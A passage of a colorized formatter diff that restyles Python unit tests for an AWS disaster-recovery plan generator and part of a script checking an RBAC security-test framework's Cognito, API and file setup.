match=\"Unknown fixture\"):\n             get_fixture(\"nonexistent\")\n \n     def test_all_plans_have_required_fields(self):\n         \"\"\"Test all fixtures have required fields.\"\"\"\n\u001b[31m-        required_fields = [\"PlanId\", \"PlanName\", \"Description\", \"AccountId\", \u001b[0m\n\u001b[31m-                          \"Region\", \"Owner\", \"RPO\", \"RTO\", \"Waves\", \u001b[0m\n\u001b[31m-                          \"CreatedDate\", \"LastModifiedDate\"]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        required_fields = [\u001b[0m\n\u001b[32m+            \"PlanId\",\u001b[0m\n\u001b[32m+            \"PlanName\",\u001b[0m\n\u001b[32m+            \"Description\",\u001b[0m\n\u001b[32m+            \"AccountId\",\u001b[0m\n\u001b[32m+            \"Region\",\u001b[0m\n\u001b[32m+            \"Owner\",\u001b[0m\n\u001b[32m+            \"RPO\",\u001b[0m\n\u001b[32m+            \"RTO\",\u001b[0m\n\u001b[32m+            \"Waves\",\u001b[0m\n\u001b[32m+            \"CreatedDate\",\u001b[0m\n\u001b[32m+            \"LastModifiedDate\",\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         fixtures = get_all_fixtures()\n         for name, plan in fixtures.items():\n             for field in required_fields:\n\u001b[31m-                assert field in plan, f\"Fixture '{name}' missing field '{field}'\"\u001b[0m\n\u001b[32m+                assert (\u001b[0m\n\u001b[32m+                    field in plan\u001b[0m\n\u001b[32m+                ), f\"Fixture '{name}' missing field '{field}'\"\u001b[0m\n \n     def test_all_waves_have_required_fields(self):\n         \"\"\"Test all waves have required fields.\"\"\"\n\u001b[31m-        required_wave_fields = [\"WaveNumber\", \"WaveName\", \"WaveDescription\",\u001b[0m\n\u001b[31m-                               \"ServerIds\", \"ExecutionType\", \"ExecutionOrder\",\u001b[0m\n\u001b[31m-                               \"Dependencies\", \"WaitTimeSeconds\"]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        required_wave_fields = [\u001b[0m\n\u001b[32m+            \"WaveNumber\",\u001b[0m\n\u001b[32m+            \"WaveName\",\u001b[0m\n\u001b[32m+            \"WaveDescription\",\u001b[0m\n\u001b[32m+            \"ServerIds\",\u001b[0m\n\u001b[32m+            \"ExecutionType\",\u001b[0m\n\u001b[32m+            \"ExecutionOrder\",\u001b[0m\n\u001b[32m+            \"Dependencies\",\u001b[0m\n\u001b[32m+            \"WaitTimeSeconds\",\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         fixtures = get_all_fixtures()\n         for name, plan in fixtures.items():\n             for wave in plan[\"Waves\"]:\n                 for field in required_wave_fields:\n\u001b[31m-                    assert field in wave, f\"Fixture '{name}' wave missing field '{field}'\"\u001b[0m\n\u001b[32m+                    assert (\u001b[0m\n\u001b[32m+                        field in wave\u001b[0m\n\u001b[32m+                    ), f\"Fixture '{name}' wave missing field '{field}'\"\u001b[0m\n \n     def test_execution_order_matches_server_count(self):\n         \"\"\"Test ExecutionOrder list length matches ServerIds length.\"\"\"\n         fixtures = get_all_fixtures()\n         for name, plan in fixtures.items():\n             for wave in plan[\"Waves\"]:\n\u001b[31m-                assert len(wave[\"ExecutionOrder\"]) == len(wave[\"ServerIds\"]), \\\u001b[0m\n\u001b[31m-                    f\"Fixture '{name}' wave {wave['WaveNumber']} has mismatched ExecutionOrder\"\u001b[0m\n\u001b[32m+                assert len(wave[\"ExecutionOrder\"]) == len(\u001b[0m\n\u001b[32m+                    wave[\"ServerIds\"]\u001b[0m\n\u001b[32m+                ), f\"Fixture '{name}' wave {wave['WaveNumber']} has mismatched ExecutionOrder\"\u001b[0m\n \n     def test_wave_numbers_are_sequential(self):\n         \"\"\"Test wave numbers are sequential starting from 1.\"\"\"\n         fixtures = get_all_fixtures()\n         for name, plan in fixtures.items():\n             wave_numbers = [w[\"WaveNumber\"] for w in plan[\"Waves\"]]\n             expected = list(range(1, len(plan[\"Waves\"]) + 1))\n\u001b[31m-            assert wave_numbers == expected, \\\u001b[0m\n\u001b[31m-                f\"Fixture '{name}' has non-sequential wave numbers\"\u001b[0m\n\u001b[32m+            assert (\u001b[0m\n\u001b[32m+                wave_numbers == expected\u001b[0m\n\u001b[32m+            ), f\"Fixture '{name}' has non-sequential wave numbers\"\u001b[0m\n\u001b[1m--- tests/python/unit/test_data_generator.py\t2025-11-19 23:10:05.843339+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_data_generator.py\t2026-01-02 15:49:03.626919+00:00\u001b[0m\n\u001b[36m@@ -16,382 +16,388 @@\u001b[0m\n     generate_instance_id,\n     generate_job_id,\n     generate_simple_plan,\n     generate_complex_plan,\n     generate_parallel_plan,\n\u001b[31m-    generate_sequential_plan\u001b[0m\n\u001b[32m+    generate_sequential_plan,\u001b[0m\n )\n \n \n class TestServerIdGeneration:\n     \"\"\"Test server ID generation.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_server_id_format(self):\n         \"\"\"Test server ID has correct format.\"\"\"\n         server_id = generate_server_id()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert server_id.startswith(\"s-\")\n         assert len(server_id) == 19  # s- + 17 hex chars\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify hex characters\n         hex_part = server_id[2:]\n\u001b[31m-        assert re.match(r'^[0-9a-f]{17}$', hex_part)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert re.match(r\"^[0-9a-f]{17}$\", hex_part)\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_server_ids_count(self):\n         \"\"\"Test generating multiple server IDs.\"\"\"\n         count = 10\n         server_ids = generate_server_ids(count)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(server_ids) == count\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify all are unique\n         assert len(set(server_ids)) == count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_server_ids_format(self):\n         \"\"\"Test all generated server IDs have correct format.\"\"\"\n         server_ids = generate_server_ids(5)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for server_id in server_ids:\n             assert server_id.startswith(\"s-\")\n             assert len(server_id) == 19\n \n \n class TestRecoveryPlanGeneration:\n     \"\"\"Test recovery plan generation.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_basic(self):\n         \"\"\"Test basic recovery plan generation.\"\"\"\n         plan = generate_recovery_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert \"PlanId\" in plan\n         assert \"Waves\" in plan\n         assert len(plan[\"Waves\"]) == 3  # Default wave count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_custom_waves(self):\n         \"\"\"Test plan generation with custom wave count.\"\"\"\n         wave_count = 5\n         plan = generate_recovery_plan(wave_count=wave_count)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == wave_count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_custom_servers(self):\n         \"\"\"Test plan generation with custom servers per wave.\"\"\"\n         servers_per_wave = 4\n         plan = generate_recovery_plan(servers_per_wave=servers_per_wave)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in plan[\"Waves\"]:\n             assert len(wave[\"ServerIds\"]) == servers_per_wave\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_with_dependencies(self):\n         \"\"\"Test plan generation with dependencies.\"\"\"\n         plan = generate_recovery_plan(wave_count=3, with_dependencies=True)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert plan[\"Waves\"][0][\"Dependencies\"] == []\n         assert plan[\"Waves\"][1][\"Dependencies\"] == [\"Wave-1\"]\n         assert plan[\"Waves\"][2][\"Dependencies\"] == [\"Wave-2\"]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_without_dependencies(self):\n         \"\"\"Test plan generation without dependencies.\"\"\"\n         plan = generate_recovery_plan(wave_count=3, with_dependencies=False)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in plan[\"Waves\"]:\n             assert wave[\"Dependencies\"] == []\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_execution_types(self):\n         \"\"\"Test plan generation with specific execution types.\"\"\"\n         execution_types = [\"PARALLEL\", \"SEQUENTIAL\", \"PARALLEL\"]\n         plan = generate_recovery_plan(\n\u001b[31m-            wave_count=3,\u001b[0m\n\u001b[31m-            execution_types=execution_types\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            wave_count=3, execution_types=execution_types\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         for i, wave in enumerate(plan[\"Waves\"]):\n             assert wave[\"ExecutionType\"] == execution_types[i]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_wait_times(self):\n         \"\"\"Test plan generation with specific wait times.\"\"\"\n         wait_times = [30, 60, 90]\n\u001b[31m-        plan = generate_recovery_plan(\u001b[0m\n\u001b[31m-            wave_count=3,\u001b[0m\n\u001b[31m-            wait_times=wait_times\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan = generate_recovery_plan(wave_count=3, wait_times=wait_times)\u001b[0m\n\u001b[32m+\u001b[0m\n         for i, wave in enumerate(plan[\"Waves\"]):\n             assert wave[\"WaitTimeSeconds\"] == wait_times[i]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_parallel_execution_order(self):\n         \"\"\"Test parallel waves have correct execution order.\"\"\"\n         plan = generate_recovery_plan(\n\u001b[31m-            wave_count=1,\u001b[0m\n\u001b[31m-            servers_per_wave=5,\u001b[0m\n\u001b[31m-            execution_types=[\"PARALLEL\"]\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            wave_count=1, servers_per_wave=5, execution_types=[\"PARALLEL\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         wave = plan[\"Waves\"][0]\n         assert all(order == 1 for order in wave[\"ExecutionOrder\"])\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_sequential_execution_order(self):\n         \"\"\"Test sequential waves have correct execution order.\"\"\"\n         servers_per_wave = 5\n         plan = generate_recovery_plan(\n             wave_count=1,\n             servers_per_wave=servers_per_wave,\n\u001b[31m-            execution_types=[\"SEQUENTIAL\"]\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            execution_types=[\"SEQUENTIAL\"],\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         wave = plan[\"Waves\"][0]\n         assert wave[\"ExecutionOrder\"] == list(range(1, servers_per_wave + 1))\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_required_fields(self):\n         \"\"\"Test generated plan has all required fields.\"\"\"\n         plan = generate_recovery_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         required_fields = [\n\u001b[31m-            \"PlanId\", \"PlanName\", \"Description\", \"AccountId\",\u001b[0m\n\u001b[31m-            \"Region\", \"Owner\", \"RPO\", \"RTO\", \"Waves\",\u001b[0m\n\u001b[31m-            \"CreatedDate\", \"LastModifiedDate\"\u001b[0m\n\u001b[32m+            \"PlanId\",\u001b[0m\n\u001b[32m+            \"PlanName\",\u001b[0m\n\u001b[32m+            \"Description\",\u001b[0m\n\u001b[32m+            \"AccountId\",\u001b[0m\n\u001b[32m+            \"Region\",\u001b[0m\n\u001b[32m+            \"Owner\",\u001b[0m\n\u001b[32m+            \"RPO\",\u001b[0m\n\u001b[32m+            \"RTO\",\u001b[0m\n\u001b[32m+            \"Waves\",\u001b[0m\n\u001b[32m+            \"CreatedDate\",\u001b[0m\n\u001b[32m+            \"LastModifiedDate\",\u001b[0m\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for field in required_fields:\n             assert field in plan\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_recovery_plan_wave_fields(self):\n         \"\"\"Test generated waves have all required fields.\"\"\"\n         plan = generate_recovery_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         required_wave_fields = [\n\u001b[31m-            \"WaveNumber\", \"WaveName\", \"WaveDescription\",\u001b[0m\n\u001b[31m-            \"ServerIds\", \"ExecutionType\", \"ExecutionOrder\",\u001b[0m\n\u001b[31m-            \"Dependencies\", \"WaitTimeSeconds\"\u001b[0m\n\u001b[32m+            \"WaveNumber\",\u001b[0m\n\u001b[32m+            \"WaveName\",\u001b[0m\n\u001b[32m+            \"WaveDescription\",\u001b[0m\n\u001b[32m+            \"ServerIds\",\u001b[0m\n\u001b[32m+            \"ExecutionType\",\u001b[0m\n\u001b[32m+            \"ExecutionOrder\",\u001b[0m\n\u001b[32m+            \"Dependencies\",\u001b[0m\n\u001b[32m+            \"WaitTimeSeconds\",\u001b[0m\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in plan[\"Waves\"]:\n             for field in required_wave_fields:\n                 assert field in wave\n \n \n class TestExecutionHistoryGeneration:\n     \"\"\"Test execution history generation.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_basic(self):\n         \"\"\"Test basic execution history generation.\"\"\"\n         plan_id = \"test-plan-001\"\n         execution = generate_execution_history(plan_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert execution[\"PlanId\"] == plan_id\n         assert \"ExecutionId\" in execution\n         assert \"Status\" in execution\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_status(self):\n         \"\"\"Test execution history with specific status.\"\"\"\n         statuses = [\"RUNNING\", \"COMPLETED\", \"FAILED\", \"CANCELLED\"]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for status in statuses:\n             execution = generate_execution_history(\"plan-001\", status=status)\n             assert execution[\"Status\"] == status\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_wave_count(self):\n         \"\"\"Test execution history with specific wave count.\"\"\"\n         wave_count = 5\n         execution = generate_execution_history(\n\u001b[31m-            \"plan-001\",\u001b[0m\n\u001b[31m-            wave_count=wave_count\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            \"plan-001\", wave_count=wave_count\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(execution[\"WaveStatuses\"]) == wave_count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_with_errors(self):\n         \"\"\"Test execution history with errors.\"\"\"\n\u001b[31m-        execution = generate_execution_history(\u001b[0m\n\u001b[31m-            \"plan-001\",\u001b[0m\n\u001b[31m-            with_errors=True\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        execution = generate_execution_history(\"plan-001\", with_errors=True)\u001b[0m\n\u001b[32m+\u001b[0m\n         assert \"Errors\" in execution\n         # Should have at least some failed servers\n         assert execution[\"FailedServers\"] > 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_without_errors(self):\n         \"\"\"Test execution history without errors.\"\"\"\n\u001b[31m-        execution = generate_execution_history(\u001b[0m\n\u001b[31m-            \"plan-001\",\u001b[0m\n\u001b[31m-            with_errors=False\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        execution = generate_execution_history(\"plan-001\", with_errors=False)\u001b[0m\n\u001b[32m+\u001b[0m\n         # All servers should be successful\n         assert execution[\"SuccessfulServers\"] == execution[\"TotalServers\"]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_server_counts(self):\n         \"\"\"Test execution history has correct server counts.\"\"\"\n         wave_count = 3\n         servers_per_wave = 4\n         execution = generate_execution_history(\n             \"plan-001\",\n             wave_count=wave_count,\n\u001b[31m-            servers_per_wave=servers_per_wave\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            servers_per_wave=servers_per_wave,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         assert execution[\"TotalServers\"] == wave_count * servers_per_wave\n\u001b[31m-        assert execution[\"SuccessfulServers\"] + execution[\"FailedServers\"] == execution[\"TotalServers\"]\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            execution[\"SuccessfulServers\"] + execution[\"FailedServers\"]\u001b[0m\n\u001b[32m+            == execution[\"TotalServers\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_timing(self):\n         \"\"\"Test execution history has valid timing.\"\"\"\n         execution = generate_execution_history(\"plan-001\", status=\"COMPLETED\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert execution[\"StartTime\"] > 0\n         assert execution[\"EndTime\"] > execution[\"StartTime\"]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_execution_history_running_no_end_time(self):\n         \"\"\"Test running execution has no end time.\"\"\"\n         execution = generate_execution_history(\"plan-001\", status=\"RUNNING\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert execution[\"EndTime\"] is None\n \n \n class TestMultipleExecutionsGeneration:\n     \"\"\"Test multiple executions generation.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_multiple_executions_count(self):\n         \"\"\"Test generating multiple executions.\"\"\"\n         count = 10\n         executions = generate_multiple_executions(count)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(executions) == count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_multiple_executions_same_plan(self):\n         \"\"\"Test generating executions for same plan.\"\"\"\n         plan_id = \"test-plan-001\"\n         executions = generate_multiple_executions(5, plan_id=plan_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for execution in executions:\n             assert execution[\"PlanId\"] == plan_id\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_multiple_executions_status_distribution(self):\n         \"\"\"Test status distribution in multiple executions.\"\"\"\n         count = 100\n\u001b[31m-        status_distribution = {\u001b[0m\n\u001b[31m-            \"COMPLETED\": 0.8,\u001b[0m\n\u001b[31m-            \"FAILED\": 0.2\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        status_distribution = {\"COMPLETED\": 0.8, \"FAILED\": 0.2}\u001b[0m\n\u001b[32m+\u001b[0m\n         executions = generate_multiple_executions(\n\u001b[31m-            count,\u001b[0m\n\u001b[31m-            status_distribution=status_distribution\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            count, status_distribution=status_distribution\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         completed = sum(1 for e in executions if e[\"Status\"] == \"COMPLETED\")\n         failed = sum(1 for e in executions if e[\"Status\"] == \"FAILED\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Allow some variance (\u00b115%)\n         assert 65 <= completed <= 95\n         assert 5 <= failed <= 35\n \n \n class TestProtectionGroupGeneration:\n     \"\"\"Test protection group generation.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_protection_group_basic(self):\n         \"\"\"Test basic protection group generation.\"\"\"\n         pg = generate_protection_group()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert \"GroupId\" in pg\n         assert \"ServerIds\" in pg\n         assert len(pg[\"ServerIds\"]) == 5  # Default count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_protection_group_custom_servers(self):\n         \"\"\"Test protection group with custom server count.\"\"\"\n         server_count = 10\n         pg = generate_protection_group(server_count=server_count)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(pg[\"ServerIds\"]) == server_count\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_protection_group_required_fields(self):\n         \"\"\"Test protection group has required fields.\"\"\"\n         pg = generate_protection_group()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         required_fields = [\n\u001b[31m-            \"GroupId\", \"GroupName\", \"Description\", \"ServerIds\",\u001b[0m\n\u001b[31m-            \"Region\", \"AccountId\", \"Tags\", \"CreatedDate\", \"LastModifiedDate\"\u001b[0m\n\u001b[32m+            \"GroupId\",\u001b[0m\n\u001b[32m+            \"GroupName\",\u001b[0m\n\u001b[32m+            \"Description\",\u001b[0m\n\u001b[32m+            \"ServerIds\",\u001b[0m\n\u001b[32m+            \"Region\",\u001b[0m\n\u001b[32m+            \"AccountId\",\u001b[0m\n\u001b[32m+            \"Tags\",\u001b[0m\n\u001b[32m+            \"CreatedDate\",\u001b[0m\n\u001b[32m+            \"LastModifiedDate\",\u001b[0m\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for field in required_fields:\n             assert field in pg\n \n \n class TestUtilityGenerators:\n     \"\"\"Test utility generator functions.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_random_string(self):\n         \"\"\"Test random string generation.\"\"\"\n         length = 15\n         s = generate_random_string(length)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(s) == length\n         assert s.isalnum()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_random_string_with_special(self):\n         \"\"\"Test random string with special characters.\"\"\"\n         s = generate_random_string(20, include_special=True)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(s) == 20\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_account_id(self):\n         \"\"\"Test AWS account ID generation.\"\"\"\n         account_id = generate_account_id()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(account_id) == 12\n         assert account_id.isdigit()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_instance_id(self):\n         \"\"\"Test EC2 instance ID generation.\"\"\"\n         instance_id = generate_instance_id()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert instance_id.startswith(\"i-\")\n         assert len(instance_id) == 19\n\u001b[31m-        assert re.match(r'^i-[0-9a-f]{17}$', instance_id)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert re.match(r\"^i-[0-9a-f]{17}$\", instance_id)\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_job_id(self):\n         \"\"\"Test DRS job ID generation.\"\"\"\n         job_id = generate_job_id()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert job_id.startswith(\"job-\")\n         assert len(job_id) == 20  # job- + 16 hex chars\n\u001b[31m-        assert re.match(r'^job-[0-9a-f]{16}$', job_id)\u001b[0m\n\u001b[32m+        assert re.match(r\"^job-[0-9a-f]{16}$\", job_id)\u001b[0m\n \n \n class TestConvenienceFunctions:\n     \"\"\"Test convenience functions for common scenarios.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_simple_plan(self):\n         \"\"\"Test simple plan generation.\"\"\"\n         plan = generate_simple_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 1\n         assert len(plan[\"Waves\"][0][\"ServerIds\"]) == 2\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_complex_plan(self):\n         \"\"\"Test complex plan generation.\"\"\"\n         plan = generate_complex_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 5\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify dependencies\n         for i in range(1, 5):\n             assert plan[\"Waves\"][i][\"Dependencies\"] == [f\"Wave-{i}\"]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_parallel_plan(self):\n         \"\"\"Test parallel plan generation.\"\"\"\n         plan = generate_parallel_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in plan[\"Waves\"]:\n             assert wave[\"ExecutionType\"] == \"PARALLEL\"\n             assert all(order == 1 for order in wave[\"ExecutionOrder\"])\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_generate_sequential_plan(self):\n         \"\"\"Test sequential plan generation.\"\"\"\n         plan = generate_sequential_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in plan[\"Waves\"]:\n             assert wave[\"ExecutionType\"] == \"SEQUENTIAL\"\n             # Verify sequential ordering\n             expected_order = list(range(1, len(wave[\"ServerIds\"]) + 1))\n             assert wave[\"ExecutionOrder\"] == expected_order\n\u001b[1m--- tests/security/validate_framework.py\t2025-12-31 16:05:30.679971+00:00\u001b[0m\n\u001b[1m+++ tests/security/validate_framework.py\t2026-01-02 15:49:03.629334+00:00\u001b[0m\n\u001b[36m@@ -10,107 +10,119 @@\u001b[0m\n import json\n import sys\n from pathlib import Path\n import os\n \n\u001b[32m+\u001b[0m\n def validate_configuration():\n     \"\"\"Validate the security testing framework configuration\"\"\"\n     print(\"\ud83d\udd27 RBAC Security Framework Validation\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Change to the security tests directory\n     script_dir = Path(__file__).parent\n     os.chdir(script_dir)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Load configuration\n     config_file = Path(\"config.json\")\n     if not config_file.exists():\n         print(\"\u274c Configuration file not found: config.json\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[31m-    with open(config_file, 'r') as f:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    with open(config_file, \"r\") as f:\u001b[0m\n         config = json.load(f)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\ud83d\udccb Environment: {config.get('environment', 'unknown')}\")\n     print(f\"\ud83c\udf0d AWS Region: {config.get('aws_region', 'unknown')}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Test AWS Cognito connection\n     try:\n         import boto3\n\u001b[31m-        cognito = boto3.client('cognito-idp', region_name=config['aws_region'])\u001b[0m\n\u001b[31m-        pool_info = cognito.describe_user_pool(UserPoolId=config['cognito_user_pool_id'])\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        cognito = boto3.client(\"cognito-idp\", region_name=config[\"aws_region\"])\u001b[0m\n\u001b[32m+        pool_info = cognito.describe_user_pool(\u001b[0m\n\u001b[32m+            UserPoolId=config[\"cognito_user_pool_id\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"\u2705 Cognito User Pool: {pool_info['UserPool']['Name']}\")\n         print(f\"   Pool ID: {config['cognito_user_pool_id']}\")\n         print(f\"   Client ID: {config['cognito_client_id']}\")\n     except Exception as e:\n         print(f\"\u274c Cognito connection failed: {str(e)}\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Test API endpoint accessibility\n     try:\n         import requests\n\u001b[32m+\u001b[0m\n         response = requests.get(f\"{config['api_base_url']}/health\", timeout=10)\n         if response.status_code in [200, 403]:  # 403 is expected without auth\n             print(f\"\u2705 API Endpoint: {config['api_base_url']}\")\n\u001b[31m-            print(f\"   Status: {response.status_code} (Expected for unauthenticated request)\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"   Status: {response.status_code} (Expected for unauthenticated request)\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n         else:\n\u001b[31m-            print(f\"\u26a0\ufe0f  API Endpoint returned unexpected status: {response.status_code}\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"\u26a0\ufe0f  API Endpoint returned unexpected status: {response.status_code}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n     except Exception as e:\n         print(f\"\u274c API connection failed: {str(e)}\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Validate framework files\n     required_files = [\n         \"rbac_security_tests.py\",\n         \"run_security_tests.py\",\n         \"test_scenarios/permission_matrix.json\",\n\u001b[31m-        \"requirements.txt\"\u001b[0m\n\u001b[32m+        \"requirements.txt\",\u001b[0m\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\ud83d\udcc1 Framework Files:\")\n     all_files_exist = True\n     for file_path in 